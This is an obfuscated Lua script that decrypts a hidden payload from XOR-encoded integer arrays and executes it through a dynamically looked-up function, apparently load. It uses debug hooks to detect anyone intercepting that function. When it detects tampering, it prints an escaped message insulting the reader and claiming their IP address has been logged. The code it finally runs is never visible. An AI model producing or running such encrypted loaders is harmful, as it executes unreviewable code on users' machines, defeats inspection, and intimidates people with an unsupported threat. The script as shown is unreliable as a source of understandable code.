                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; hfsghtGPuWqn5hctGTWc6z0UgSY2Jay1Bq8aSs6giut9pRCsc69M6xldnrXIFO00lvHznDF9Yby(
{ 696, 1077, 1143, 796, 903, 746, 640, 1098, 901, 1200, 1198, 884, 1178, 1023, 698, 911, 836, 1142, 1199, 756, 755, 1028,
  676, 761, 611, 1038, 966, 764, 845, 931, 998, 565, 726, 1105, 602, 1035, 996, 1011, 570, 811, 1141, 760, 725, 915, 636,
  1182, 730, 618, 972, 1149, 1175, 925, 862, 1129, 1193, 1031, 881, 558, 753, 897, 914, 1107, 632, 682, 616, 1152, 989,
  783, 957, 1030, 1116, 1114, 1015, 1168, 865, 1090, 1187, 568, 926, 630, 1148, 1139, 1020, 812, 1051, 1003, 701, 902,
  944, 891, 564, 791, 775, 967, 1212, 839, 1062, 1118, 1108, 856, 1018, 904, 1210, 997, 1113, 1049, 1161, 766, 656, 663,
  550, 964, 929, 1083, 1066, 837, 984, 650, 579, 830, 1211, 752, 905, 1206, 841, 748, 1180, 769, 1054, 638, 1205, 1016,
  781, 1196, 651, 758, 1075, 1096, 940, 1106, 1029, 797, 888, 779, 879, 627, 759, 1184, 843, 1027, 690, 577, 932, 1076,
  737, 645, 747, 864, 620, 671, 685, 591, 1147, 773, 674, 874, 958, 1101, 583, 1201, 933, 1047, 817, 1034, 692, 1068,
  543, 586, 582, 678, 875, 684, 661, 1207, 644, 654, 767, 665, 604, 587, 704, 1170, 1055, 1188, 702, 1009, 598, 1084,
  560, 712, 691, 639, 641, 1056, 790, 892, 566, 847, 898, 727, 995, 1112, 742, 833, 718, 987, 720, 971, 599, 962, 622,
  947, 617, 810, 590, 979, 1172, 1197, 1181, 588, 576, 573, 581, 615, 1155, 745, 927, 1115, 1092, 633, 1102, 1008, 851,
  1033, 724, 593, 575, 873, 1174, 614, 799, 825, 1093, 1000, 1167, 869, 619, 1004, 906, 672, 867, 803, 683, 1194, 1006,
  983, 870, 623, 713, 969, 1001, 1128, 788, 955, 1060, 822, 809, 1195, 1138, 1067, 1146, 637, 1145, 1012, 800, 1111, 738,
  806, 1100, 549, 876, 757, 1124, 634, 571, 733, 928, 801, 711, 592, 980, 677, 1065, 1063, 657, 942, 572, 716, 1014,
  1164, 625, 744, 1169, 848, 739, 1166, 1088, 610, 982, 1036, 689, 1053, 961, 772, 729, 1071, 871, 818, 563, 846, 896,
  1086, 963, 557, 990, 956, 655, 924, 559, 1005, 949, 1160, 1072, 714, 606, 941, 624, 1157, 1137, 708, 1081, 921, 600,
  731, 695, 855, 938, 802, 1044, 1074, 1158, 751, 1103, 886, 1007, 1080, 750, 991, 827, 643, 910, 868, 612, 1002, 771,
  1173, 853, 816, 1125, 832, 1045, 595, 697, 795, 647, 596, 857, 908, 670, 1013, 960, 842, 642, 1019, 943, 1153, 1043,
  709, 992, 1024, 567, 694, 786, 850, 826, 866, 736, 952, 945, 1185, 976, 635, 792, 916, 900, 950, 552, 823, 946, 894,
  1099, 613, 930, 1183, 659, 1203, 1130, 882, 1191, 1094, 728, 551, 1037, 877, 951, 666, 918, 1110, 732, 646, 920, 890,
  693, 1162, 780, 953, 831, 968, 854, 919, 1151, 1061, 715, 1017, 774, 1156, 660, 861, 1186, 662, 936, 977, 948, 719,
  1069, 1177, 814, 722, 594, 688, 893, 556, 669, 835, 1163, 829, 793, 1131, 679, 1109, 954, 1132, 1097, 749, 1026, 553,
  705, 699, 1095, 1104, 804, 562, 798, 784, 631, 574, 860, 899, 605, 743, 1058, 819, 608, 913, 849, 1121, 1189, 1117,
  985, 1123, 554, 1050, 1048, 680, 1091, 1078, 912, 965, 1179, 834, 658, 681, 1136, 686, 717, 545, 721, 673, 585, 1150,
  1082, 1120, 1022, 776, 852, 546, 807, 975, 883, 1032, 544, 1041, -1, 21, 92, 45, 80, 71, 100, 38, 31, 24, 26, 5, 37,
  34, 69, 71, 40, 19, 104, 217, 97, 78, 1, 59, 6, 32, 80, 93, 103, 25, 93, 51, 71, 25, 31, 86, 205, 7, 1, 89, 72, 74, 41,
  16, 84, 79, 1, 49, 100, 124, 112, 56, 93, 75, 8, 193, 79, 120, 87, 53, 23, 118, 94, 85, 77, 113, 23, 143, 61, 87, 23,
  105, 77, 63, 25, 87, 11, 3, 93, 28, 2, 26, 95, 70, 178, 30, 153, 232, 11, 85, 63, 56, 87, 73, 58, 0, 125, 73, 31, 0,
  31, 110, 67, 80, 37, 84, 80, 203, 57, 17, 208, 171, 104, 20, 17, 44, 85, 23, 95, 82, 31, 47, 241, 110, 76, 41, 63, 17,
  88, 99, 2, 87, 27, 133, 5, 2, 112, 120, 18, 71, 112, 20, 91, 22, 42, 81, 78, 95, 21, 105, 127, 91, 36, 100, 127, 120,
  6, 123, 171, 82, 95, 97, 2, 60, 203, 93, 90, 87, 239, 65, 76, 24, 61, 59, 9, 95, 95, 93, 74, 65, 18, 140, 122, 100, 1,
  64, 20, 8, 21, 87, 31, 98, 160, 15, 48, 24, 29, 14, 92, 175, 2, 67, 5, 19, 38, 71, 109, 87, 90, 97, 86, 14, 132, 18,
  76, 116, 34, 54, 87, 47, 1, 171, 8, 1, 41, 29, 66, 47, 206, 120, 52, 80, 12, 74, 124, 82, 51, 32, 90, 21, 108, 4, 87,
  184, 87, 86, 24, 135, 92, 112, 82, 23, 75, 81, 61, 62, 20, 107, 26, 38, 81, 14, 80, 58, 23, 99, 90, 45, 87, 112, 38,
  161, 64, 9, 112, 125, 94, 87, 231, 119, 17, 109, 74, 68, 26, 17, 182, 87, 3, 69, 87, 120, 87, 105, 33, 51, 221, 71,
  233, 27, 19, 112, 47, 20, 75, 68, 71, 120, 55, 68, 87, 77, 4, 75, 11, 2, 224, 53, 31, 27, 85, 219, 82, 87, 22, 7, 125,
  2, 2, 4, 51, 36, 107, 19, 85, 14, 99, 22, 72, 67, 112, 82, 32, 89, 24, 153, 77, 144, 87, 60, 102, 83, 111, 82, 120, 28,
  77, 33, 20, 127, 63, 87, 97, 112, 87, 200, 97, 108, 74, 2, 21, 108, 94, 8, 104, 79, 18, 25, 81, 112, 250, 165, 30, 14,
  5, 10, 120, 82, 77, 103, 68, 80, 158, 230, 44, 159, 120, 237, 65, 3, 24, 17, 61, 48, 90, 90, 64, 14, 19, 120, 8, 60,
  77, 34, 97, 100, 107, 63, 1, 57, 52, 18, 18, 104, 28, 95, 59, 63, 72, 101, 31, 142, 235, 66, 16, 20, 119, 75, 17, 73,
  65, 42, 31, 27, 201, 80, 19, 30, 80, 114, 67, 19, 230, 86, 58, 24, 68, 184, 24, 61, 108, 5, 36, 71, 31, 17, 18, 99,
  134, 121, 53, 18, 88, 87, 1, 56, 10, 61, 95, 105, 74, 53, 41, 16, 33, 10, 1, 49, 8, 44, 20, 100, 89, 47, 87, 32, 3,
  196, 60, 3, 106, 3, 18, 100, 219, 70, 112, 0, 15, 77, 206, 41, 80, 116, 64, 98, 77, 13, 18, 98, 120, 8, 44, 42, 43, 2,
  93, 18, 115, 34, 73, 208, 71, 65, 102, 55, 3, 79, 2, 77, 29, 108, 80, 244, 81, 10, 73, 78, 109, 93, 84, 62, 112, 18,
  87, 87, 26, 17, 69, 100, 24, 87, 71, 91, 108, 34, 66, 112, 4, 7, 104, 85, 21, 29, 55, 112, 86, 146, 4, 112, 140, 24,
  79, 87, 241, 35, 51, 18, 120, 108, 112, 4, 133, 114, 90, 54, 61, 111, 248, 87, 24, 31, 82, 21, 29, 91, 0, 45, 11, 80,
  56, 32, 155, 1, 34, 41, 80, 114, 42, 19, 73, 77, 36, 50, 42, 94, 88, 89, 107, 31, 8, 112, 7, 20, 242, 56, 63, 62, 21,
  64, 89, 87, 24, 89, 33, 20, 119, 77, 40, 77, 225, 90, 40, 7, 61, 20, 44, 120, 56, 124, 204, 108, 70, 127, 86, 85, 77,
  149, 90, 100, 99 }, "ugzO1Imw7LXPmPwwDkXq2gpA4w"); rB0w2znF5jEWnWWBZ437sJK7oA8maRcv87JV4w90Bzfwltm5LlXEbiBUFgzUZ =
oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY; gl8Wb6afGKulLCks0xPY7QJ0KqkMF6ZdTAVE4tw1sNxQoX4erfFBRnLhT =
oFN6GYd9VW8TLo7G8XCH8CIhDqZlLj21KmedrT8nfVjIt27SPwgmloOY; nNc37vWD2ESWd3Lus5FBvHcVKKhh698Ql1vJ4bfqyfb7RmaKuDcuM4AR =
gl8Wb6afGKulLCks0xPY7QJ0KqkMF6ZdTAVE4tw1sNxQoX4erfFBRnLhT; wGuR4RQ2qdn7JTbNczEPVxR0861B7cvbkkWT5bW0RNKzz3W4K5025dmT46U5Y4dHYM =
nNc37vWD2ESWd3Lus5FBvHcVKKhh698Ql1vJ4bfqyfb7RmaKuDcuM4AR; voqfmiJuVneqxdal5eU2NhMljiQUzUuWS92LNEOjZtNPfTuvtTV8niFZyQMftRcL0So8L =
wGuR4RQ2qdn7JTbNczEPVxR0861B7cvbkkWT5bW0RNKzz3W4K5025dmT46U5Y4dHYM; bKXTzuGoNiEeVrYVmAXZRAfYpPTCAc8M2k4gMtYZm1HawbgHtIHyAZzP9AWn6F =
voqfmiJuVneqxdal5eU2NhMljiQUzUuWS92LNEOjZtNPfTuvtTV8niFZyQMftRcL0So8L; p1gv2WRy3Qx3elQDX2ZcFDntUSLO5Q3Fu77c3gQ6Z5EIf5bGDO5bDpymVqOvC8 =
bKXTzuGoNiEeVrYVmAXZRAfYpPTCAc8M2k4gMtYZm1HawbgHtIHyAZzP9AWn6F; bHNgMMaAEZfbSCxqjI3kHGbcKuLWEweeFZiReKOSH4hXWphIiKMSSYXIEathGg6EBE30dlji =
p1gv2WRy3Qx3elQDX2ZcFDntUSLO5Q3Fu77c3gQ6Z5EIf5bGDO5bDpymVqOvC8; cEtRLfwX4rMiyvSRLBcOlRHdKFOCOgG3NCPppoxARGKSvBEBsxjtagrxYqzxT1 =
bHNgMMaAEZfbSCxqjI3kHGbcKuLWEweeFZiReKOSH4hXWphIiKMSSYXIEathGg6EBE30dlji; bj6lQHzOnJlu1B7Pwa2HKXf3uE4FegQCJFUqzx602oJ17f4Av3rQHRhGQxtjWvBRENLzbVd =
cEtRLfwX4rMiyvSRLBcOlRHdKFOCOgG3NCPppoxARGKSvBEBsxjtagrxYqzxT1; jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG =
bj6lQHzOnJlu1B7Pwa2HKXf3uE4FegQCJFUqzx602oJ17f4Av3rQHRhGQxtjWvBRENLzbVd; ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS = function(
  a)
  K, F = 5892660748302950, 16384 + 3256; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; xpIAQogpvtxsHgitgJKMeh5DGWyo7FAHbic1SRgq7tGS4yu6g6R2OEEPlag = function(b)
  co = coroutine.create(b)
  gIIkirKtqLGpGrHUPYFWeLTd1C5H6eruiyEQGzR8QORwuqk9HJlUpEouj = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(gIIkirKtqLGpGrHUPYFWeLTd1C5H6eruiyEQGzR8QORwuqk9HJlUpEouj, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return gIIkirKtqLGpGrHUPYFWeLTd1C5H6eruiyEQGzR8QORwuqk9HJlUpEouj
end; fHg7FjtCIYNQV6bUvHlH8wNcQHwqQimn08IlBw78tO3RZJFksuZ3r7Hdsn1x4e5LyHrvnVGaU1G = function(f, g)
  eOhdWjWVjrPlJPf6orTBxRgCKbRCIS5GwRUwHMnPuKYLyim0SXDDT = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; cWmGgL5QZKZe71UAUral9747Cr9BwBjgVUc6DAtliQCngRxgnhmcnXlGju0gYUmz0F = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; k0MCGg97Tly0IvhWiBfxQffwCLj89Kr5ISyjueCvnM8ZYJ9UvwCDBNmvSg9Uz = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      eOhdWjWVjrPlJPf6orTBxRgCKbRCIS5GwRUwHMnPuKYLyim0SXDDT(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; yKKPh13jwIel2xYCFxSMEOtufyr6r9qej79lIRZKOj6qaOU1y7hBp = function(p, n)
    c6wjP7kDM94kJPfwKDkcDB3kaQqNGg1QhXfVCfEvEXrJvQYvgHbYFK1 = ""
    for k, q in pairs(p) do c6wjP7kDM94kJPfwKDkcDB3kaQqNGg1QhXfVCfEvEXrJvQYvgHbYFK1 =
      c6wjP7kDM94kJPfwKDkcDB3kaQqNGg1QhXfVCfEvEXrJvQYvgHbYFK1 ..
      jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG
      [ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('C2') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('75') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('0F') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('C4') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('43') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('5E')]
      [ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('92') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('11') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('2C') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('0F')](
      q) end
    ; n(c6wjP7kDM94kJPfwKDkcDB3kaQqNGg1QhXfVCfEvEXrJvQYvgHbYFK1)
  end; cWmGgL5QZKZe71UAUral9747Cr9BwBjgVUc6DAtliQCngRxgnhmcnXlGju0gYUmz0F(f,
    function(r) k0MCGg97Tly0IvhWiBfxQffwCLj89Kr5ISyjueCvnM8ZYJ9UvwCDBNmvSg9Uz(r, g,
        function(s) yKKPh13jwIel2xYCFxSMEOtufyr6r9qej79lIRZKOj6qaOU1y7hBp(s,
            function(t) if #xpIAQogpvtxsHgitgJKMeh5DGWyo7FAHbic1SRgq7tGS4yu6g6R2OEEPlag(jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG[ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('DD') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('F6') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('2C') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('45')]) == 1 then if jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG[ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('DD') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('F6') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('2C') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('45')] == jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG[ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('A9') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('0F') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('C4') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('43') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('75')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG[ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('DD') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('F6') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('2C') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('45')](t) then
                    jR9kAK97iLwXrhdbQEHDN3gue6nBDf3vBlT6Pl58123Yt04c7NBiA1CiDCYkhSbG
                        [ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('DD') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('F6') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('2C') .. ogGseCQJU8ILwugAwj5WBvu3bQ1fkK1CTtZTMTlUfclygZyIeMnoBvKRO7vENw50OUgBgEOS('45')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; fHg7FjtCIYNQV6bUvHlH8wNcQHwqQimn08IlBw78tO3RZJFksuZ3r7Hdsn1x4e5LyHrvnVGaU1G(
{ 917, 794, 1135, 957, 712, 1059, 1212, 578, 765, 877, 789, 896, 999, 1113, 726, 561, 977, 595, 761, 756, 719, 1037,
  1087, 767, 1201, 695, 978, 1155, 1044, 626, 1126, 935, 974, 940, 1015, 879, 873, 837, 1164, 928, 871, 784, 798, 981,
  1030, 599, 727, 584, 1091, 823, 801, 1082, 1072, 802, 633, 1012, 621, 859, 821, 851, 555, 759, 601, 1009, 969, 775,
  822, 1165, 1023, 1069, 1205, 902, 1081, 932, 1137, 745, 868, 758, 990, 1169, 746, 921, 628, 1006, 954, 897, 744, 825,
  862, 732, 667, 635, 870, 918, 992, 608, 1139, 1173, 672, 1062, 1000, 558, 576, 874, 945, 717, 933, 887, 1128, 754, 630,
  1183, 644, 710, 699, 1099, 987, 657, 923, 840, 872, 733, 835, 681, 1175, 1185, 1208, 796, 961, 1153, 1021, 878, 1063,
  1014, 1005, 1095, 773, 1019, 618, 901, 849, 1160, 1167, 716, 989, 858, 1096, 1124, 842, 543, 1150, 666, 671, 936, 852,
  678, 963, 771, 803, 1100, 563, 748, 605, 808, 738, 741, 1050, 665, 652, 898, 975, 570, 1011, 934, 616, 1048, 682, 1035,
  926, 571, 888, 1040, 776, 1159, 993, 951, 1140, 786, 988, 591, 800, 1064, 594, 1073, 1196, 891, 1125, 910, 892, 752,
  1102, 958, 689, 1202, 692, 1027, 663, 772, 603, 890, 680, 952, 980, 553, 617, 830, 623, 1190, 762, 676, 1178, 658, 774,
  1024, 996, 661, 763, 855, 1127, 620, 656, 588, 698, 985, 1025, 841, 817, 679, 1133, 785, 1180, 597, 637, 919, 592, 545,
  736, 577, 1130, 700, 769, 813, 684, 600, 1181, 807, 1008, 853, 893, 568, 833, 959, 693, 883, 585, 1038, 610, 818, 683,
  548, 1120, 598, 750, 780, 1017, 820, 1152, 927, 1085, 1098, 1142, 779, 970, 687, 1109, 1004, 713, 1049, 1054, 1132,
  973, 1108, 886, 845, 1090, 1200, 1079, 645, 1195, 755, 770, 1093, 580, 925, 1094, 839, 737, 942, 797, 1036, 702, 1018,
  1111, 589, 1080, 782, 1070, 911, 815, 1157, 573, 867, 1052, 956, 715, 791, 1056, 827, 906, 575, 854, 685, 920, 1110,
  1156, 1032, 1210, 1211, 828, 583, 728, 757, 938, 724, 908, 673, 843, 1141, 564, 640, 948, 615, 781, 659, 625, 562, 944,
  686, 805, 966, 882, 743, 1138, 701, 734, 1092, 1168, 1143, 1060, 1089, 795, 703, 1007, 1121, 1114, 579, 662, 569, 1101,
  602, 1163, 922, 829, 982, 1203, 912, 810, 972, 653, 1174, 857, 1107, 914, 965, 903, 572, 947, 1022, 638, 697, 778,
  1074, 1154, 670, 937, 1066, 557, 1065, 889, 869, 850, 1129, 721, 1039, 1002, 587, 1083, 565, 664, 885, 574, 848, 819,
  881, 714, 567, 799, 1136, 1071, 1103, 549, 655, 804, 1197, 834, 939, 1193, 688, 997, 915, 1148, 694, 691, 1068, 606,
  930, 787, 792, 739, 1075, 865, 812, 860, 1191, 1026, 1034, 674, 651, 960, 619, 880, 1146, 894, 1199, 814, 643, 1078,
  704, 983, 566, 1192, 740, 660, 705, 777, 866, 1084, 1057, 559, 1061, 1194, 1177, 624, 622, 836, 899, 1051, 614, 1131,
  916, 607, 634, 1042, 838, 979, 668, 711, 1047, 1003, 909, 876, 1204, 632, 1149, 1166, 764, 1172, 1158, 1161, 642, 641,
  1067, 604, 1046, 913, 1088, 609, 1104, 1123, 864, 582, 639, 1077, 793, 1028, 554, 766, 962, 790, 1189, 1058, 844, 612,
  1020, 649, 1001, 751, 907, 709, 994, 722, 654, -1, 12, 69, 34, 145, 25, 56, 46, 138, 220, 165, 70, 19, 33, 235, 66, 66,
  97, 105, 17, 116, 116, 47, 69, 102, 107, 47, 108, 85, 83, 30, 32, 115, 116, 26, 56, 26, 106, 88, 220, 87, 111, 0, 125,
  181, 62, 16, 111, 49, 79, 99, 206, 109, 39, 107, 18, 41, 95, 30, 38, 68, 79, 67, 121, 114, 18, 120, 87, 32, 7, 96, 63,
  125, 108, 76, 125, 62, 32, 10, 33, 68, 53, 109, 22, 26, 209, 61, 101, 61, 135, 104, 114, 66, 108, 254, 59, 60, 111, 64,
  87, 11, 27, 45, 60, 118, 48, 96, 109, 197, 8, 96, 24, 8, 11, 93, 37, 70, 68, 115, 116, 103, 70, 114, 126, 93, 43, 111,
  243, 43, 6, 9, 3, 101, 229, 46, 7, 125, 96, 126, 80, 94, 103, 13, 87, 87, 22, 15, 75, 58, 89, 30, 60, 122, 46, 49, 46,
  25, 50, 94, 53, 6, 125, 63, 87, 150, 225, 4, 97, 107, 55, 53, 31, 104, 34, 60, 40, 56, 89, 173, 16, 23, 113, 3, 99, 60,
  94, 38, 68, 46, 20, 38, 105, 19, 149, 51, 22, 100, 38, 56, 108, 72, 66, 45, 78, 40, 16, 66, 55, 50, 17, 115, 117, 17,
  108, 74, 87, 125, 37, 58, 75, 97, 59, 106, 0, 99, 12, 73, 25, 43, 122, 105, 99, 109, 36, 80, 111, 57, 11, 62, 109, 87,
  58, 68, 6, 80, 39, 164, 53, 111, 62, 5, 87, 31, 104, 12, 26, 22, 97, 125, 84, 58, 117, 82, 89, 220, 9, 80, 56, 64, 3,
  101, 123, 80, 99, 82, 34, 26, 111, 2, 44, 36, 14, 100, 56, 55, 77, 17, 75, 80, 72, 73, 5, 75, 67, 83, 99, 122, 30, 16,
  59, 67, 32, 30, 87, 122, 209, 87, 40, 91, 28, 88, 7, 75, 18, 119, 3, 13, 22, 34, 223, 36, 178, 122, 47, 87, 46, 84, 95,
  112, 109, 22, 35, 53, 48, 111, 63, 41, 40, 31, 87, 18, 85, 99, 18, 109, 84, 83, 3, 104, 127, 26, 23, 11, 161, 58, 5,
